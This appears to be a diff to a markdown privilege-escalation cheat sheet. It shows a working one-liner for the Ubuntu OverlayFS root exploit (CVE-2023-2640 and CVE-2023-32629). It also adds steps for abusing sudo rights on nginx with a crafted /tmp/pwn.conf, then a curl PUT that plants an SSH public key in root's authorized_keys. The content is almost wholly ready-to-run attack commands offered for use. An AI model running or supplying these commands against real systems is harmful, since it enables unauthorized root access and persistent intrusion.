@@ -133,7 +133,8 @@ Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629):
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
 ```
 
-NGINX sudo:
+Abuse NGINX sudo for privesc:
+----
 create the following /tmp/pwn.conf on box:
 ```conf
 user root;
@@ -156,7 +157,7 @@ sudo nginx -c /tmp/pwn.conf
 ss -tunlp
 #make sure port 1337 is opened
 ssh-keygen
-
+curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat id_rsa.pub)"
 ```
 
 
